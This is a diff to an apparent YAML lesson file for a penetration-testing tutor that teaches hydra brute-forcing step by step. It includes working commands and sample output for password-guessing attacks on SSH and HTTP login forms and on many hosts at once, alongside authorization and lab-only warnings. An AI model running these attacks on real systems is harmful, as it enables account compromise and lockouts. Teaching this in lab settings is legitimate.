@@ -11,8 +11,154 @@ authorization_text: >
   and trigger alerts/IPS. Confirm lockout policy first and pace with low -t + -w. Practice
   on your own lab VMs, Metasploitable, or DVWA. Continue?
 flows:
+  - flow_id: guided
+    title: "Guided first attack (START HERE)"
+    goal: "From an open login service to a found credential — safely paced, inputs explained."
+    command_builder_id: hydra
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
+    steps:
+      - step_id: g1
+        title: "Confirm the login service is open"
+        slot_target: null
+        glossary_refs: [service_module, online_vs_offline]
+        explanation:
+          what: "hydra attacks a LIVE service — SSH, FTP, RDP, a web login, etc. First confirm the service is actually listening on the target."
+          why: "Every hydra guess is a real login attempt. Attacking a closed port just fails; and on real accounts, guessing can LOCK THEM OUT — know the lockout policy before you start."
+          where: "The target host and the service name go at the END of the command."
+        find_it: >
+          Use the nmap tool to see which login services are open (22=ssh, 21=ftp, 3389=rdp,
+          3306=mysql). Only test systems you own or are authorized to. If the target has an
+          account-lockout policy (e.g. locks after 5 bad tries), brute-forcing can lock real
+          users out — get explicit sign-off first.
+        command_anatomy:
+          - {token: "nmap", does: "the port scanner (see the nmap tool)"}
+          - {token: "-p 22", does: "check port 22 (SSH)"}
+          - {token: "192.168.1.10", does: "the target host"}
+        try_this: "nmap -p 22 192.168.1.10"
+        success_criteria: "The service shows as open (e.g. 22/tcp open ssh)."
+        expected_output: |
+          PORT   STATE SERVICE
+          22/tcp open  ssh
+        alternatives:
+          - trigger: "the port is closed/filtered"
+            cause: "That service isn't running, or it's on a different port."
+            fix: "Scan more ports (`nmap -p- 192.168.1.10`) to find the real login service and port."
+            check: "You have an open service + its port number."
+      - step_id: g2
+        title: "Prepare a username and a password list"
+        slot_target: null
+        glossary_refs: [password_list, rockyou]
+        explanation:
+          what: "hydra needs candidates: one or more USERNAMES and a list of PASSWORDS to try. Passwords usually come from a wordlist like rockyou."
+          why: "The lists ARE the attack. A focused username plus a good password list is far more effective (and quieter) than everything-vs-everything."
+          where: "Usernames go with -l/-L, passwords with -p/-P."
+        find_it: >
+          Usernames: make a small users.txt (one per line) from recon, or common ones like
+          admin/root. Passwords: rockyou ships gzipped on Kali — unpack it once. See the
+          Wordlists lesson for building targeted lists.
+        command_anatomy:
+          - {token: "printf 'admin\\nroot\\n' > users.txt", does: "create a 2-line username file"}
+          - {token: "sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz", does: "unpack the rockyou password list (keeps the .gz)"}
+        try_this: "printf 'admin\\nroot\\n' > users.txt && sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz && wc -l users.txt /usr/share/wordlists/rockyou.txt"
+        success_criteria: "You have users.txt and an unpacked rockyou.txt (line counts print)."
+        expected_output: |
+          2 users.txt
+          14344392 /usr/share/wordlists/rockyou.txt
+        alternatives:
+          - trigger: "rockyou.txt.gz already unpacked"
+            cause: "You did it before."
+            fix: "Fine — just use /usr/share/wordlists/rockyou.txt."
+            check: "The file exists."
+          - trigger: "rockyou is huge — too slow against a live service"
+            cause: "14 million guesses over the network is impractical and noisy."
+            fix: "Use a small top-100/top-1000 list against live services; save rockyou for OFFLINE hash cracking (john/hashcat)."
+            check: "You pick a small list for online attacks."
+      - step_id: g3
+        title: "Test a single credential first"
+        slot_target: POSITIONAL_ARGS
+        glossary_refs: [login]
+        explanation:
+          what: "`-l admin -p <pass>` tries ONE username/password pair. -V prints each attempt so you can see it working."
+          why: "Proving the syntax and service work with one guess avoids launching a huge run that fails for a silly reason."
+          where: "-l/-p are options; the target and service come LAST as positionals."
+        find_it: "Pick one username and one likely password. The service name is lowercase (ssh, ftp, rdp...)."
+        command_anatomy:
+          - {token: "hydra", does: "the program"}
+          - {token: "-l admin", does: "try the single username 'admin' (lowercase L)"}
+          - {token: "-p admin123", does: "try the single password 'admin123'"}
+          - {token: "-V", does: "verbose — show every attempt"}
+          - {token: "192.168.1.10", does: "the target host"}
+          - {token: "ssh", does: "the service/protocol to attack"}
+        try_this: "hydra -l admin -p admin123 -V 192.168.1.10 ssh"
+        success_criteria: "hydra shows the attempt; on a correct pair it prints a green [22][ssh] ... login/password line."
+        expected_output: |
+          [ATTEMPT] target 192.168.1.10 - login "admin" - pass "admin123"
+          [22][ssh] host: 192.168.1.10   login: admin   password: admin123
+          1 of 1 target successfully completed, 1 valid password found
+        alternatives:
+          - trigger: "connection refused / could not connect"
+            cause: "Service down, wrong port, or wrong service name."
+            fix: "Confirm with nmap; if the port is non-standard add `-s <port>` (e.g. -s 2222)."
+            check: "nmap shows the service open on that port."
+          - trigger: "the single guess was wrong (no valid pair)"
+            cause: "That password isn't right — expected."
+            fix: "Move on to the list attack (next step)."
+            check: "You proceed with lists."
+      - step_id: g4
+        title: "Run the list attack — paced to be safe"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [tasks, lockout]
+        explanation:
+          what: "`-L users.txt -P passwords.txt` tries each username against each password. `-t 4` keeps it to 4 parallel tries; `-f` stops at the first valid pair."
+          why: "Low parallelism (-t 4) reduces the chance of lockouts and IPS alerts. -f saves time once you get in."
+          where: "-L/-P/-t/-f are options; target + service stay last."
+        find_it: "Use the users.txt and password list from step 2. Keep -t low (1-4) on anything with lockout; raise it only on a robust lab."
+        command_anatomy:
+          - {token: "-L users.txt", does: "try every username in this file (capital L)"}
+          - {token: "-P /usr/share/wordlists/rockyou.txt", does: "try every password in this file (capital P)"}
+          - {token: "-t 4", does: "only 4 parallel attempts (gentle — avoids lockouts)"}
+          - {token: "-f", does: "stop as soon as one valid pair is found"}
+          - {token: "192.168.1.10 ssh", does: "target host + service"}
+        try_this: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f 192.168.1.10 ssh"
+        success_criteria: "hydra reports a valid login/password pair (or exhausts the list)."
+        expected_output: |
+          [DATA] attacking ssh://192.168.1.10:22/
+          [22][ssh] host: 192.168.1.10   login: admin   password: password1
+          1 of 1 target successfully completed, 1 valid password found
+        alternatives:
+          - trigger: "the target rate-limits or blocks you"
+            cause: "Too aggressive — the service is throttling or an IPS reacted."
+            fix: "Slow right down: `-t 1 -w 30` (one try at a time, 30s wait). This is the 'careful' pace."
+            check: "Attempts go through without being dropped."
+          - trigger: "accounts got locked"
+            cause: "You exceeded the lockout threshold."
+            fix: "Stop. Loop users OUTSIDE passwords with -u, use a tiny password list, and respect the policy. Warn the owner."
+            check: "You have authorization and a lockout-safe plan."
+      - step_id: g5
+        title: "Save any credentials you find"
+        slot_target: OUTPUT_OPTIONS
+        explanation:
+          what: "`-o hits.txt` writes found credentials to a file."
+          why: "You want a durable record of what worked — for the report and the next step."
+          where: "OUTPUT_OPTIONS; -o names the file."
+        find_it: "Choose a filename in a folder you own. Treat found credentials as sensitive — store and delete them responsibly."
+        command_anatomy:
+          - {token: "hydra -L users.txt -P ... -t 4 -f", does: "the paced list attack from step 4"}
+          - {token: "-o ~/scans/hydra.txt", does: "save any found credentials to this file"}
+          - {token: "192.168.1.10 ssh", does: "target + service"}
+        try_this: "mkdir -p ~/scans && hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -o ~/scans/hydra.txt 192.168.1.10 ssh"
+        success_criteria: "~/scans/hydra.txt holds any credentials found (check with `cat`)."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: password1
+          $ cat ~/scans/hydra.txt
+          [22][ssh] host: 192.168.1.10   login: admin   password: password1
+        alternatives:
+          - trigger: "the run got interrupted"
+            cause: "You stopped it or lost connection."
+            fix: "Resume where it left off with `hydra -R`."
+            check: "It continues instead of restarting."
   - flow_id: single_test
-    title: "Target + service + a single credential test"
+    title: "Single credential test (reference)"
     goal: "Verify one credential pair works before any list."
     command_builder_id: hydra
     slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
@@ -25,8 +171,16 @@ flows:
           what: "`-l <user> -p <pass>` then `<target> <service>`; -V shows attempts, -f stops on success."
           why: "hydra attacks a LIVE service — every guess is a real login. Cracking captured hashes offline is john/hashcat."
           where: "creds in ACTION_OPTIONS; target+service are POSITIONAL (last)."
+        find_it: "One username, one password, the target host, and the lowercase service name."
+        command_anatomy:
+          - {token: "-l admin", does: "single username"}
+          - {token: "-p admin123", does: "single password"}
+          - {token: "-V -f", does: "verbose; stop on first success"}
+          - {token: "192.168.1.10 ssh", does: "target + service (positional, last)"}
         try_this: "hydra -l admin -p admin123 -V -f 192.168.1.10 ssh"
         success_criteria: "hydra prints [ssh] host: ... login: admin password: admin123 on a hit."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: admin123
         alternatives:
           - trigger: "connection refused / wrong port"
             cause: "Service down or non-standard port."
@@ -37,7 +191,7 @@ flows:
             fix: "Move to username/password lists."
             check: "Switch to the lists flow."
   - flow_id: lists
-    title: "Username list × password list"
+    title: "Username list × password list (reference)"
     goal: "Try many users against many passwords."
     command_builder_id: hydra
     slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
@@ -50,15 +204,22 @@ flows:
           what: "`-L users.txt -P passwords.txt` tries each combination."
           why: "Covers more ground; -f stops at the first valid pair."
           where: "ACTION_OPTIONS (creds come before the positional target)."
+        find_it: "A users.txt and a password list; keep them small first."
+        command_anatomy:
+          - {token: "-L users.txt", does: "username list"}
+          - {token: "-P passwords.txt", does: "password list"}
+          - {token: "-V -f", does: "verbose; stop on first hit"}
         try_this: "hydra -L users.txt -P passwords.txt -V -f 192.168.1.10 ssh"
         success_criteria: "Any valid pair(s) reported."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: hunter2
         alternatives:
           - trigger: "very slow / many users"
             cause: "Large lists × high parallelism."
             fix: "Lower -t and keep lists small first; -u loops users outer for lockout-sensitive targets."
             check: "Re-run with -t 4."
   - flow_id: wordlists_tune
-    title: "Real wordlists + tuning tasks"
+    title: "Real wordlists + tuning tasks (reference)"
     goal: "Use rockyou-style lists; control parallelism."
     command_builder_id: hydra
     slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
@@ -71,15 +232,22 @@ flows:
           what: "rockyou ships gzipped: `sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`; -t sets parallel tasks (default 16)."
           why: "Lower -t for stability and to reduce lockouts/noise; raise only on robust labs."
           where: "GLOBAL_OPTIONS (-t)."
+        find_it: "Unpack rockyou once; choose -t based on how robust/lockout-safe the target is."
+        command_anatomy:
+          - {token: "-P /usr/share/wordlists/rockyou.txt", does: "the big password list"}
+          - {token: "-t 4", does: "4 parallel tasks (default is 16 — lower is gentler)"}
         try_this: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -V 192.168.1.10 ssh"
         success_criteria: "The run proceeds at a sane rate; hits reported."
+        expected_output: |
+          [DATA] max 4 tasks per 1 server, overall 4 tasks
+          [22][ssh] host: 192.168.1.10   login: admin   password: iloveyou
         alternatives:
           - trigger: "target rate-limits / blocks you"
             cause: "Too aggressive for the target."
             fix: "Drop to -t 1 -w 30 (the Careful profile)."
             check: "Watch for lockouts; slow down."
   - flow_id: http_form
-    title: "HTTP login form (http-post-form) — the tricky one"
+    title: "HTTP login form (reference)"
     goal: "Brute a web login form correctly."
     command_builder_id: hydra
     slots: [PROGRAM, ACTION_OPTIONS, POSITIONAL_ARGS]
@@ -92,8 +260,19 @@ flows:
           what: "Form modules need 3 colon parts: \"<path>:<body with ^USER^/^PASS^>:<failure marker>\" (F=fail or S=success)."
           why: "^USER^/^PASS^ mark injection points; the failure marker tells hydra what 'wrong' looks like."
           where: "service + form string are POSITIONAL (last)."
+        find_it: >
+          Submit a WRONG login in your browser with dev tools open (Network tab). Note the form's
+          path, the POST body field names, and the exact error message shown on failure — those
+          three become the colon-separated parts.
+        command_anatomy:
+          - {token: "http-post-form", does: "the service module for a POST login form"}
+          - {token: "/login.php", does: "part 1 — the form's path"}
+          - {token: "user=^USER^&pass=^PASS^", does: "part 2 — POST body; ^USER^/^PASS^ are where guesses go"}
+          - {token: "F=Invalid credentials", does: "part 3 — text that appears when a login FAILS"}
         try_this: "hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials\""
         success_criteria: "A valid pair is reported."
+        expected_output: |
+          [80][http-post-form] host: 192.168.1.10   login: admin   password: letmein
         alternatives:
           - trigger: "every attempt shows wrongly as success/failure"
             cause: "Failure/success marker is off."
@@ -104,7 +283,7 @@ flows:
             fix: "Needs token-tracking tooling; note and consult docs."
             check: "Inspect the form for a hidden token."
   - flow_id: extras
-    title: "Extra tries & combo lists"
+    title: "Extra tries & combo lists (reference)"
     goal: "Cheap wins and user:pass files."
     command_builder_id: hydra
     slots: [PROGRAM, ACTION_OPTIONS, POSITIONAL_ARGS]
@@ -117,15 +296,21 @@ flows:
           what: "`-e nsr` adds null password, same-as-login, reversed-login; `-C user:pass.txt` uses a combo file."
           why: "Catches trivial credentials fast; combo files replace -L+-P."
           where: "ACTION_OPTIONS (-C); -e in GLOBAL_OPTIONS."
+        find_it: "-e nsr needs no extra input; -C needs a file of user:pass lines."
+        command_anatomy:
+          - {token: "-e nsr", does: "also try: null password, password=username, reversed username"}
+          - {token: "-C user:pass.txt", does: "(alternative) a file of user:pass pairs, one per line"}
         try_this: "hydra -L users.txt -e nsr 192.168.1.10 ssh"
         success_criteria: "Trivial credentials (if present) are found."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: admin
         alternatives:
           - trigger: "no extra hits"
             cause: "No trivial credentials in use."
             fix: "Proceed with a real password list."
             check: "Move to the wordlist flow."
   - flow_id: output_resume
-    title: "Output, resume & stop-on-success"
+    title: "Output, resume & stop-on-success (reference)"
     goal: "Save hits and resume interrupted runs."
     command_builder_id: hydra
     slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
@@ -137,15 +322,23 @@ flows:
           what: "`-o found.txt` saves hits (`-b json` format); `-f` stop per host, `-F` global; `-R` resumes."
           why: "Keep results and continue an aborted session without starting over."
           where: "OUTPUT_OPTIONS (-o/-b)."
+        find_it: "A writable output path; -R needs the leftover hydra.restore file from a prior run."
+        command_anatomy:
+          - {token: "-o hits.txt", does: "save found credentials to this file"}
+          - {token: "-f", does: "stop this host on first success"}
+          - {token: "-R", does: "(separate run) resume the previous session"}
         try_this: "hydra -L users.txt -P rockyou.txt -o hits.txt -f 192.168.1.10 ssh"
         success_criteria: "hits.txt holds any found credentials."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: password1
+          (written to hits.txt)
         alternatives:
           - trigger: "interrupted mid-run"
             cause: "Session aborted."
             fix: "Resume with `hydra -R`."
             check: "Re-run with -R."
   - flow_id: multi_target
-    title: "Multiple targets"
+    title: "Multiple targets (reference)"
     goal: "Run against many hosts at once."
     command_builder_id: hydra
     slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
@@ -157,8 +350,16 @@ flows:
           what: "`-M targets.txt` runs against many hosts; combine with -o for one result file."
           why: "Pace carefully (low -t) to avoid hammering many hosts."
           where: "ACTION_OPTIONS (-M replaces the positional target)."
+        find_it: "A targets.txt with one host per line; the service name still goes last."
+        command_anatomy:
+          - {token: "-M targets.txt", does: "attack every host listed in this file"}
+          - {token: "-o hits.txt", does: "consolidate all hits into one file"}
+          - {token: "ssh", does: "the service (no single positional host when using -M)"}
         try_this: "hydra -L users.txt -P passwords.txt -M targets.txt -o hits.txt ssh"
         success_criteria: "Consolidated hits across hosts in hits.txt."
+        expected_output: |
+          [22][ssh] host: 192.168.1.10   login: admin   password: password1
+          [22][ssh] host: 192.168.1.11   login: root    password: toor
         alternatives:
           - trigger: "too much load"
             cause: "Many hosts × high -t."
